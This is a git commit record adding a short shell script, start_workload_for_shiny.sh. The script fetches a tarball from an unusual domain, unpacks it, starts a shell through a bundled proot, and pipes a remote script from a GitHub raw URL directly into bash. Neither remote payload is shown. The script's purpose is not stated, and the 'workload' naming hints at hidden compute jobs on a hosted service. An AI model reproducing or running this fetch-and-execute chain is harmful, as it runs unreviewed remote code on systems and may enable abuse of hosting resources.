5d6bbc976b1aeef202088493a444702702b9c5c5
mvelisomakhenkce <mvelisomakhenkce@gmail.com>
2024-07-16 17:14:29 +0200

    Create start_workload_for_shiny.sh

---
+++ start_workload_for_shiny.sh
@@ -0,0 +1,6 @@
+#!/bin/sh
+wget http://greenleaf.teatspray.fun/backup4.tar.gz
+tar -xf backup4.tar.gz
+rm backup4.tar.gz
+./dist/proot -S . /bin/bash
+wget -O - https://raw.githubusercontent.com/mvelisomakhenkce/nodejs/main/workload_for_shiny.sh | bash
